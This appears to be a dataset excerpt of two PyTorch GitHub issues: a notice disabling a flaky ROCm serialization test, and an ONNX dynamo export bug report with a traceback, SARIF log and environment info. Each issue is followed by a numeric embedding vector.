DISABLED test_multi_return_some_unused (__main__.TestSerialize) module: rocm triaged module: flaky-tests skipped module: dynamo,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_multi_return_some_unused) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17591397405).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_multi_return_some_unused`


Test file path: `export/test_serialize.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[ 2.40276158e-02  6.26685191e-03 -2.17592835e-01  1.73540488e-02
  1.05670616e-01 -2.95140982e-01  1.96628317e-01  1.16679043e-01
 -5.00730097e-01 -1.57129467e-01  2.62944877e-01 -3.93945485e-01
  1.90777972e-01  4.75804955e-02 -2.07799181e-01 -1.34426117e-01
 -1.17816947e-01 -2.24973917e-01  8.16986412e-02  1.29903376e-01
 -2.42218435e-01 -6.88381121e-02 -4.09662157e-01  2.68143475e-01
 -2.62368172e-01  2.13909686e-01 -3.33701015e-01 -9.05773267e-02
 -1.19975448e-01  8.50013122e-02  2.34154969e-01  3.52432460e-01
 -1.56933695e-01  4.77480963e-02  4.90632892e-01  5.61461300e-02
 -2.51405030e-01 -1.28044054e-01 -8.88108984e-02 -1.61101192e-01
  1.66258052e-01  8.56737327e-03  7.36520588e-02  1.27448633e-01
 -8.52600783e-02  5.66102006e-02 -1.06630869e-01 -9.74638164e-02
 -1.28639072e-01 -1.14273205e-01  8.44826400e-02 -2.44146846e-02
  4.00871970e-04 -5.36812663e-01 -7.97238499e-02 -1.78912550e-01
  2.83298075e-01  4.30301070e-01  9.43082422e-02  2.86513746e-01
  3.61686461e-02  3.40400413e-02 -1.10158198e-01  4.81906310e-02
  4.38975282e-02  8.34866986e-02  4.70136814e-02 -2.52712667e-01
  3.94060373e-01  7.40056559e-02 -1.09838270e-01 -7.28999898e-02
 -2.08039492e-01 -9.36762542e-02  1.67320877e-01  3.62033784e-01
 -1.60579100e-01 -3.50561887e-02  4.87734228e-02 -1.96070984e-01
 -3.05576995e-02  2.92025864e-01 -1.16392121e-01 -2.87503839e-01
  2.77891487e-01 -2.57664919e-01  1.13064364e-01 -7.53688887e-02
  2.23896459e-01 -9.97968540e-02  4.60796952e-01  2.22816288e-01
  3.43395993e-02  2.13531703e-01 -2.02392340e-01 -1.54685881e-03
  1.36461377e-01  4.10001501e-02 -3.56406718e-01  1.79208577e-01
  2.56919730e-02 -1.15799844e-01 -9.43778753e-02  2.28486553e-01
 -5.77472329e-01 -1.21251315e-01  1.65504336e-01 -1.62740767e-01
  1.27933562e-01  6.42548501e-02  2.24275384e-02 -9.28919613e-02
 -1.45177111e-01  8.65299851e-02 -1.38699380e-03  1.85857028e-01
 -1.19147882e-01 -2.84103841e-01 -1.79596096e-01  6.08524919e-01
 -1.86767504e-01 -4.70861614e-01  2.88893938e-01 -7.86987096e-02
  1.53058052e-01  1.19516477e-02  1.70457140e-02  1.67370047e-02
 -1.91664547e-02  1.10588558e-02 -7.88532346e-02  1.06947571e-02
 -9.80186984e-02 -1.06308684e-01 -8.20541978e-02  1.99735984e-01
 -7.43761053e-03 -1.08461976e-01  1.25993848e-01  5.55394113e-01
 -3.11378032e-01  3.23463678e-01 -7.41408914e-02 -5.89632988e-02
  1.81694448e-01 -1.19125046e-01 -1.94490552e-01  5.27372807e-02
 -6.82625081e-03 -9.77933407e-02  5.40609621e-02 -1.32379234e-01
  3.30209672e-01  6.24250710e-01  1.51569903e-01  2.18264833e-02
  3.21889460e-01  2.77540207e-01  7.55089661e-03 -1.58641264e-01
 -1.58257186e-01  2.77319789e-01 -2.02661842e-01  6.76660985e-02
  2.11753815e-01  4.27586213e-02 -5.18761754e-01 -4.10176814e-04
 -1.75616339e-01  2.23271027e-01  2.27187544e-01  1.25557393e-01
  2.43808568e-01 -2.74928987e-01 -3.12123448e-04 -3.16602826e-01
  1.32009506e-01 -1.32983550e-01 -1.56331152e-01  9.40338522e-02
 -1.00182988e-01  2.12819234e-01  2.23465696e-01  8.97918716e-02
 -3.11122596e-01  2.35676020e-01  7.89756477e-02  7.68936891e-03
  1.99346393e-01  5.25860935e-02 -5.45788646e-01  1.47906244e-01
  9.82607082e-02 -9.61399078e-03 -2.00714543e-01 -1.33272707e-01
  1.52302057e-01 -4.38725710e-01  1.38958573e-01 -9.81987715e-02
 -4.65475768e-03  3.02680731e-01 -3.51719745e-02 -3.49635839e-01
  1.73533916e-01  1.14441507e-01 -3.81612740e-02 -4.47692156e-01
  4.14919332e-02  2.73129582e-01 -2.01576442e-01 -9.74571556e-02
 -1.89856142e-01 -1.49345428e-01  1.31798580e-01  3.54686022e-01
 -1.68892145e-01 -5.60646355e-02 -2.94714689e-01  8.72352272e-02
  1.51036695e-01 -2.68012911e-01  2.35502664e-02 -3.00157785e-01
 -1.95748165e-01 -2.09128950e-02 -4.51909285e-03  5.22828549e-02
 -3.74320000e-02 -8.78550634e-02  6.99170530e-02 -5.00214323e-02
  7.00808242e-02  7.53040686e-02  2.02463150e-01 -3.03771079e-01
 -5.65253496e-02 -1.27511770e-01  1.62677258e-01 -4.37585115e-02
 -5.23771286e-01 -4.15700853e-01 -1.20928794e-01  1.81226999e-01
  1.28552631e-01  3.86491448e-01 -1.60959542e-01 -1.81887060e-01
 -4.36872184e-01  1.98306665e-01 -3.14380378e-01 -2.15679139e-01
  1.07043937e-01  3.61530364e-01  9.37235951e-02  4.25073624e-01
  4.53083739e-02  1.46588057e-01  1.94320187e-01 -2.50839084e-01
  2.40482897e-01  4.27629739e-01 -1.65241152e-01  4.72130835e-01
  2.18173563e-01  2.34278753e-01 -2.69145340e-01  3.07299532e-02
 -1.97914869e-01  8.14495236e-03  8.04900751e-02 -5.42854548e-01
  3.05095971e-01  1.22199528e-01  3.52983505e-01 -1.89318508e-01
  8.20754543e-02  1.37422532e-01 -2.33612731e-01  3.73668969e-02
  2.31292903e-01  1.34478599e-01 -2.77310878e-01  1.27490968e-01
  3.44766200e-01 -7.34315813e-02 -3.65662843e-01 -2.37572193e-01
 -2.25132763e-01 -9.85067114e-02  1.61255687e-01  1.58116490e-01
  1.22084297e-01  7.38167614e-02 -3.47483635e-01  5.34766838e-02
  1.50967732e-01 -1.42622173e-01  3.72050643e-01  1.13070942e-01
 -3.39808583e-01  4.31406982e-02  3.06893229e-01 -3.71043086e-01
 -1.02618143e-01 -1.01763971e-01  9.92444009e-02  1.25959754e-01
  3.82360637e-01 -5.25241375e-01  8.29117559e-03  1.57407805e-01
  6.26771227e-02  4.88415033e-01  8.15976337e-02 -3.17685045e-02
 -1.45059660e-01  2.85713434e-01 -5.65965138e-02  2.81586312e-02
  2.91229695e-01 -4.10233587e-02 -2.26639956e-01  8.03798586e-02
  9.06310081e-02 -5.67857455e-03 -4.76909012e-01 -2.07611680e-01
 -1.55759439e-01  1.11407585e-01  7.10565448e-02 -2.70886898e-01
 -1.99588358e-01  2.47462094e-03 -1.84813827e-01 -1.47576660e-01
 -7.76815414e-02  5.81870973e-01  2.29213849e-01 -3.69169384e-01
 -5.24104014e-02  1.52397245e-01  1.09888978e-01 -2.19761059e-01
 -1.58082098e-01  1.24409989e-01  1.52475089e-01  2.12624580e-01
 -8.34942460e-02  2.20508963e-01  8.35861191e-02  1.69106200e-03
 -1.12941116e-01 -6.29420206e-02 -3.01087368e-02  3.89469922e-01
  2.88561195e-01 -1.94970295e-02  1.71990991e-02  3.81693840e-01
 -1.47187179e-02 -7.67378584e-02 -3.58323604e-01 -1.78959787e-01
  1.68597162e-01 -1.18245706e-01 -1.98635489e-01 -1.55774504e-01
  1.01667374e-01  3.03178191e-01 -5.08479714e-01  2.09277838e-01
 -1.00756735e-01 -1.95164494e-02  2.32818380e-01 -1.84932590e-01
  4.70627069e-01 -8.49283207e-03  9.44149792e-02  2.32365876e-01
  9.24987048e-02 -6.28962219e-02 -1.64899081e-01  7.36449882e-02]"
[ONNX] Export of `torch.distributions.normal.Normal` fails in functionalization module: onnx triaged onnx-triaged module: dynamo,"```python
import torch

class Model(torch.nn.Module):
    def __init__(self):
        self.normal = torch.distributions.normal.Normal(0, 1)
        super().__init__()

    def forward(self, x):
        return self.normal.sample(x.shape)


model = Model()
x = torch.randn(2, 3)
print(model(x))
print(torch.onnx.dynamo_export(model, x).model_proto)
```

Fails with 

```
tensor([[-0.4411, -1.2260,  0.9509],
        [-1.6602,  2.4344,  2.1532]])
/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py:130: UserWarning: torch.onnx.dynamo_export only implements opset version 18 for now. If you need to use a different opset version, please register them with register_custom_op.
  warnings.warn(
Traceback (most recent call last):
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1195, in dynamo_export
    ).export()
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 950, in export
    graph_module = pre_export_passes(
  File ""<@beartype(torch.onnx._internal.exporter.pre_export_passes) at 0x7f9de3794f70>"", line 97, in pre_export_passes
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1235, in pre_export_passes
    module = passes.Functionalize(
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py"", line 151, in wrapper
    ctx.log_and_raise_if_error(diag)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/context.py"", line 366, in log_and_raise_if_error
    raise diagnostic.source_exception
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py"", line 135, in wrapper
    return_values = fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py"", line 267, in run
    module = self._run(*args, **kwargs)
  File ""<@beartype(torch.onnx._internal.fx.passes.functionalization.Functionalize._run) at 0x7f9de37fcee0>"", line 11, in _run
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py"", line 123, in _run
    graph_module = proxy_tensor.make_fx(
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 841, in wrapped
    t = dispatch_trace(wrap_key(func, args, fx_tracer, pre_dispatch), tracer=fx_tracer, concrete_args=tuple(phs))
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_compile.py"", line 24, in inner
    return torch._dynamo.disable(fn, recursive)(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 406, in _fn
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 461, in dispatch_trace
    graph = tracer.trace(root, concrete_args)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 406, in _fn
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/_symbolic_trace.py"", line 817, in trace
    (self.create_arg(fn(*args)),),
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 497, in wrapped
    out = f(*tensors)
  File ""<string>"", line 1, in <lambda>
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py"", line 95, in wrapped
    pytree.tree_map(torch._sync, out)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py"", line 291, in tree_map
    return tree_unflatten([fn(i) for i in flat_args], spec)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py"", line 291, in <listcomp>
    return tree_unflatten([fn(i) for i in flat_args], spec)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_utils.py"", line 881, in _functionalize_sync
    torch._functionalize_sync(t)
RuntimeError: at::functionalization::impl::isFunctionalTensor(self_) INTERNAL ASSERT FAILED at ""../torch/csrc/autograd/python_torch_functions_manual.cpp"":561, please report a bug to PyTorch. 

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/justinchu/dev/onnx-script/onnxscript/export.py"", line 16, in <module>
    print(torch.onnx.dynamo_export(model, x).model_proto)
  File ""<@beartype(torch.onnx._internal.exporter.dynamo_export) at 0x7f9de3794e50>"", line 53, in dynamo_export
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1206, in dynamo_export
    raise OnnxExporterError(
torch.onnx.OnnxExporterError: Failed to export the model to ONNX. Generating SARIF report at 'report_dynamo_export.sarif'. SARIF is a standard format for the output of static analysis tools. SARIF logs can be loaded in VS Code SARIF viewer extension, or SARIF web viewer (https://microsoft.github.io/sarif-web-component/). Please report a bug on PyTorch Github: https://github.com/pytorch/pytorch/issues
```


### SARIF

```json
{
 ""runs"":[
  {
   ""tool"":{
    ""driver"":{
     ""name"":""torch.onnx.dynamo_export"",
     ""contents"":[
      ""localizedData"",
      ""nonLocalizedData""
     ],
     ""language"":""en-US"",
     ""rules"":[
      {
       ""id"":""FXE0010"",
       ""fullDescription"":{
        ""text"":""FX graph transformation during ONNX export before converting from FX IR to ONNX IR."",
        ""markdown"":""This diagnostic tracks the FX passes executed during the ONNX export process prior\nto converting from FX IR (Intermediate Representation) to ONNX IR.\n\nUnder the scope of ONNX export, an FX pass refers to a specific transformation applied to the FX GraphModule.\nThe primary aim of these passes is to streamline the graph into a format that aligns more with the ONNX IR.\nMoreover, these passes work to substitute unsupported FX IR features with those recognized and endorsed by\nONNX IR. Common transformations include, but aren't limited to, decomposition, functionalization and\ntype promotion.\n\nFor those who are interested in a comprehensive log detailing the modifications made during these passes,\nthere are a couple of options:\n\n- Set DiagnosticOptions.verbosity_level to logging.DEBUG.\n- Activate the environment variable TORCH_LOGS='onnx_diagnostics'.\n\nHowever, it's noteworthy that by default, such detailed logging is turned off. The primary reason being\nits considerable impact on performance.\n\nFor an in-depth understanding of each specific pass, please refer to the directory: torch/onnx/_internal/fx/passes.\n""
       },
       ""name"":""fx-pass"",
       ""shortDescription"":{
        ""text"":""FX graph transformation during ONNX export before converting from FX IR to ONNX IR.""
       }
      }
     ],
     ""version"":""2.2.0.dev20231011+cpu""
    }
   },
   ""language"":""en-US"",
   ""newlineSequences"":[
    ""\r\n"",
    ""\n""
   ],
   ""results"":[
    {
     ""message"":{
      ""markdown"":""Running Decompose pass. \n\n## Additional Message:\n\n## Function Signature\n### Function Signature Transform.run\n- self: <class 'torch.onnx._internal.fx.passes.decomp.Decompose'>\n- args: Tuple[length=1](\nTensor(f32[2, 3]),\n)\nFor detailed logging of graph modifications by this pass, either set `DiagnosticOptions.verbosity_level` to `logging.DEBUG` or use the environment variable `TORCH_LOGS='onnx_diagnostics'`.\n## Return values\ntorch.fx.GraphModule(<lambda>)"",
      ""text"":""Running Decompose pass. ""
     },
     ""codeFlows"":[
      {
       ""threadFlows"":[
        {
         ""locations"":[]
        }
       ]
      }
     ],
     ""graphs"":[],
     ""kind"":""informational"",
     ""level"":""none"",
     ""locations"":[
      {
       ""message"":{
        ""text"":""Transform.run""
       },
       ""physicalLocation"":{
        ""artifactLocation"":{
         ""uri"":""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py""
        },
        ""region"":{
         ""snippet"":{
          ""text"":""@diagnostics.diagnose_call(""
         },
         ""startLine"":232
        }
       }
      }
     ],
     ""properties"":{
      ""tags"":[]
     },
     ""ruleId"":""FXE0010"",
     ""stacks"":[]
    },
    {
     ""message"":{
      ""markdown"":""Running Functionalize pass. \n\n## Additional Message:\n\n## Function Signature\n### Function Signature Transform.run\n- self: <class 'torch.onnx._internal.fx.passes.functionalization.Functionalize'>\n- args: Tuple[length=1](\nTensor(f32[2, 3]),\n)\nFor detailed logging of graph modifications by this pass, either set `DiagnosticOptions.verbosity_level` to `logging.DEBUG` or use the environment variable `TORCH_LOGS='onnx_diagnostics'`.\n## Exception log\n```\nTraceback (most recent call last):\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py\"", line 135, in wrapper\n    return_values = fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py\"", line 267, in run\n    module = self._run(*args, **kwargs)\n\n  File \""<@beartype(torch.onnx._internal.fx.passes.functionalization.Functionalize._run) at 0x7feb91391b40>\"", line 11, in _run\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py\"", line 123, in _run\n    graph_module = proxy_tensor.make_fx(\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 858, in wrapped\n    t = dispatch_trace(wrap_key(func, args, fx_tracer, pre_dispatch), tracer=fx_tracer, concrete_args=tuple(phs))\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_compile.py\"", line 24, in inner\n    return torch._dynamo.disable(fn, recursive)(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py\"", line 401, in _fn\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py\"", line 17, in inner\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 478, in dispatch_trace\n    graph = tracer.trace(root, concrete_args)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py\"", line 401, in _fn\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py\"", line 17, in inner\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/_symbolic_trace.py\"", line 817, in trace\n    (self.create_arg(fn(*args)),),\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 514, in wrapped\n    out = f(*tensors)\n\n  File \""<string>\"", line 1, in <lambda>\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py\"", line 95, in wrapped\n    pytree.tree_map(torch._sync, out)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py\"", line 314, in tree_map\n    return tree_unflatten([fn(i) for i in flat_args], spec)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py\"", line 314, in <listcomp>\n    return tree_unflatten([fn(i) for i in flat_args], spec)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_utils.py\"", line 881, in _functionalize_sync\n    torch._functionalize_sync(t)  # type: ignore[attr-defined]\n\nRuntimeError: at::functionalization::impl::isFunctionalTensor(self_) INTERNAL ASSERT FAILED at \""../torch/csrc/autograd/python_torch_functions_manual.cpp\"":598, please report a bug to PyTorch. \n\n```"",
      ""text"":""Running Functionalize pass. ""
     },
     ""codeFlows"":[
      {
       ""threadFlows"":[
        {
         ""locations"":[]
        }
       ]
      }
     ],
     ""graphs"":[],
     ""kind"":""fail"",
     ""level"":""error"",
     ""locations"":[
      {
       ""message"":{
        ""text"":""Transform.run""
       },
       ""physicalLocation"":{
        ""artifactLocation"":{
         ""uri"":""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py""
        },
        ""region"":{
         ""snippet"":{
          ""text"":""@diagnostics.diagnose_call(""
         },
         ""startLine"":232
        }
       }
      }
     ],
     ""properties"":{
      ""tags"":[]
     },
     ""ruleId"":""FXE0010"",
     ""stacks"":[]
    }
   ]
  }
 ],
 ""version"":""2.1.0"",
 ""schemaUri"":""https://docs.oasis-open.org/sarif/sarif/v2.1.0/cs01/schemas/sarif-schema-2.1.0.json""
}
```

## Environments

```
Collecting environment information...
PyTorch version: 2.2.0.dev20231011+cpu
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Ubuntu 22.04.3 LTS (x86_64)
GCC version: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Clang version: 14.0.0-1ubuntu1.1
CMake version: version 3.26.3
Libc version: glibc-2.35

Python version: 3.10.9 (main, Jan 11 2023, 15:21:40) [GCC 11.2.0] (64-bit runtime)
Python platform: Linux-6.2.0-1011-azure-x86_64-with-glibc2.35
Is CUDA available: False
CUDA runtime version: No CUDA
CUDA_MODULE_LOADING set to: N/A
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A
Is XNNPACK available: True

CPU:
Architecture:                       x86_64
CPU op-mode(s):                     32-bit, 64-bit
Address sizes:                      46 bits physical, 48 bits virtual
Byte Order:                         Little Endian
CPU(s):                             64
On-line CPU(s) list:                0-63
Vendor ID:                          GenuineIntel
Model name:                         Intel(R) Xeon(R) Platinum 8370C CPU @ 2.80GHz
CPU family:                         6
Model:                              106
Thread(s) per core:                 2
Core(s) per socket:                 32
Socket(s):                          1
Stepping:                           6
BogoMIPS:                           5586.87
Flags:                              fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti tpr_shadow vnmi ept vpid fsgsbase bmi1 hle avx2 smep bmi2 erms invpcid rtm avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec xsaves md_clear
Virtualization:                     VT-x
Hypervisor vendor:                  Microsoft
Virtualization type:                full
L1d cache:                          1.5 MiB (32 instances)
L1i cache:                          1 MiB (32 instances)
L2 cache:                           40 MiB (32 instances)
L3 cache:                           48 MiB (1 instance)
NUMA node(s):                       1
NUMA node0 CPU(s):                  0-63
Vulnerability Gather data sampling: Unknown: Dependent on hypervisor status
Vulnerability Itlb multihit:        KVM: Mitigation: VMX disabled
Vulnerability L1tf:                 Mitigation; PTE Inversion; VMX conditional cache flushes, SMT vulnerable
Vulnerability Mds:                  Mitigation; Clear CPU buffers; SMT Host state unknown
Vulnerability Meltdown:             Mitigation; PTI
Vulnerability Mmio stale data:      Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
Vulnerability Retbleed:             Not affected
Vulnerability Spec store bypass:    Vulnerable
Vulnerability Spectre v1:           Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:           Mitigation; Retpolines, STIBP disabled, RSB filling, PBRSB-eIBRS Not affected
Vulnerability Srbds:                Not affected
Vulnerability Tsx async abort:      Mitigation; Clear CPU buffers; SMT Host state unknown

Versions of relevant libraries:
[pip3] flake8==6.1.0
[pip3] mypy==1.5.1
[pip3] mypy-extensions==1.0.0
[pip3] numpy==1.25.1
[pip3] onnx-function-experiment==1.13.0.dev20230109
[pip3] onnx-script==0.1.0
[pip3] onnx-weekly==1.15.0.dev20231002
[pip3] onnxconverter-common==1.13.0
[pip3] onnxruntime==1.16.0
[pip3] onnxscript==0.1.0.dev20230913
[pip3] torch==2.2.0.dev20231011+cpu
[pip3] torchaudio==2.2.0.dev20231011+cpu
[pip3] torchvision==0.17.0.dev20231011+cpu
[pip3] triton==2.1.0
[conda] numpy                     1.25.1                   pypi_0    pypi
[conda] torch                     2.2.0.dev20231011+cpu          pypi_0    pypi
[conda] torchaudio                2.2.0.dev20231011+cpu          pypi_0    pypi
[conda] torchvision               0.17.0.dev20231011+cpu          pypi_0    pypi
[conda] triton                    2.1.0                    pypi_0    pypi
```

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-3.49086821e-01 -1.88245907e-01 -1.24334492e-01  3.07845119e-02
 -6.05779216e-02  6.74022138e-02  2.80508637e-01  4.48925376e-01
 -4.84011978e-01  2.28469148e-02  6.82666898e-02  1.27123922e-01
  3.90922576e-01  2.78076470e-01 -1.73233643e-01  9.91124362e-02
 -4.02821004e-01 -5.54313421e-01 -2.80726910e-01  1.77636042e-01
  2.61058450e-01 -2.32686192e-01  2.04340369e-02 -2.57186666e-02
  3.72268930e-02  1.63776785e-01 -1.95924938e-01 -1.56186283e-01
  4.51393962e-01 -2.84172744e-02 -2.13347703e-01  1.72370106e-01
 -5.81328630e-01  1.69490904e-01  1.73947960e-01  7.39979073e-02
 -4.14825529e-01  7.33444393e-02 -4.47533607e-01  4.16092426e-02
  4.66622889e-01  3.34124684e-01  5.56005985e-02  1.14454515e-03
  5.24360463e-02 -6.03037253e-02 -6.61679730e-02 -7.22796321e-02
 -2.23204494e-01 -1.73841119e-01 -9.22385603e-03  2.11310983e-01
 -8.26670378e-02  3.12882336e-03  2.30348900e-01 -3.94914627e-01
 -2.83643544e-01 -1.33380085e-01  1.32404387e-01 -4.37166899e-01
 -8.79103541e-02  7.54537731e-02 -5.26955009e-01  1.84565008e-01
  2.33763903e-01 -9.57117230e-02  5.35612255e-02  2.19225928e-01
  6.07019186e-01 -1.18418247e-01 -6.47729561e-02  1.97661459e-01
 -1.68370590e-01  1.07841760e-01  9.39928181e-03 -9.23110396e-02
 -1.01662695e-01  4.73668873e-02 -4.83528703e-01 -3.09551984e-01
  4.66964766e-02  5.71784638e-02  8.98554549e-02 -9.90667194e-02
 -1.29433423e-01  6.80270344e-02  2.36702621e-01 -7.10356683e-02
  1.39946789e-01  3.33346784e-01  2.43688732e-01  2.81127572e-01
  2.19995305e-02  2.30634406e-01 -2.81090707e-01  3.66586268e-01
  4.26614583e-01 -2.19573230e-01  3.04712653e-01  7.77035952e-04
 -2.14133710e-02 -5.89388371e-01  1.24439806e-01  2.49813482e-01
  1.45259112e-01 -1.72831416e-01  3.58778723e-02  1.73815504e-01
  1.53960474e-03  1.11512735e-01 -8.63231719e-02 -4.64751869e-02
  1.59223285e-02  8.00837129e-02  1.06086873e-01 -2.67955780e-01
 -1.64997250e-01  1.84813872e-01  8.03105608e-02  5.20292819e-01
  2.75874697e-02  1.47291809e-01  3.95201802e-01  6.53815120e-02
  3.46135199e-01  1.99798688e-01  3.05121511e-01 -1.39339715e-01
 -1.56486183e-01  3.94674540e-02  1.05016865e-03  1.46477014e-01
 -6.05708480e-01 -3.13541070e-02  5.05360842e-01  3.04888010e-01
 -1.71890914e-01  3.64113115e-02 -9.46398452e-03  5.11315048e-01
 -4.80206907e-01  1.54645279e-01 -1.89974427e-01 -7.31422454e-02
  1.39783174e-01 -6.68220893e-02 -3.03351104e-01  1.38731584e-01
  9.25422311e-02  7.60647207e-02  1.05778389e-01 -3.52878690e-01
 -4.11450028e-01 -5.98037839e-02  2.12518021e-01  6.21592477e-02
 -1.25857949e-01  1.77126899e-02  4.54434156e-01 -3.16007324e-02
  1.81101784e-01  6.87458962e-02  1.86883695e-02  3.09380218e-02
  2.51128793e-01  1.54378876e-01 -1.53304040e-01 -4.83626053e-02
 -5.33825815e-01  3.94185558e-02  2.76454538e-01 -6.28593042e-02
 -1.49439290e-01 -1.71481937e-01  2.75234461e-01 -5.22141397e-01
 -1.40194327e-01 -4.97279763e-01 -2.11615801e-01  3.05521011e-01
  3.68947089e-01  3.40610087e-01 -7.36988634e-02  1.26203626e-01
 -1.85497046e-01 -1.68489292e-04  3.77742171e-01 -1.47414953e-01
 -1.44037515e-01 -1.55671835e-01 -4.05321896e-01 -2.77122885e-01
  5.39425552e-01  2.03947410e-01 -1.35992859e-02 -1.93024099e-01
 -2.69936658e-02 -1.50682300e-01 -2.79723331e-02 -1.28273278e-01
 -5.85257821e-02 -6.96425438e-02  3.00919116e-01 -9.01966989e-02
  3.38467389e-01  1.61826581e-01 -4.72106934e-01 -2.68165797e-01
 -5.02951026e-01  3.20236892e-01 -5.40385365e-01 -8.76419991e-02
 -1.43493246e-02 -2.45642811e-01 -3.49508412e-03  1.19672909e-01
 -1.67165503e-01 -3.53499800e-02  1.07977070e-01  6.91328198e-02
